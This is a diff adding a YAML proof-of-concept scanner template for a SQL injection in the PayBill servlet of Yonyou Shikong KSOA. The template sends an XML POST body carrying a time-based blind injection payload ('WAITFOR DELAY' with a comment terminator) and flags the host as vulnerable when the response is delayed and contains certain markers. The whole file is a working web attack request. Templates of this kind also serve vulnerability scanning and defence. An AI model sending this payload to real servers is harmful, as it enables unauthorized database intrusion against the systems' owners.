@@ -1,0 +1,16 @@
+id: poc-yaml-yysk-KSOA-PayBill-sql-injection
+info:
+  name: 用友时空 KSOA  PayBill SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+requests:
+- method: POST
+  path: /servlet/PayBill?caculate&_rnd=
+  data: <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR
+    DELAY '00:00:05';--</name><name>1</name><name>102360</name></root>
+  expression: status_code == 200 && duration > 5 && contains(body,"102360") && contains(body,"<errmsg>")&&
+    content_type == "text/xml;charset=UTF-8"
+variables: {}
+transport: http
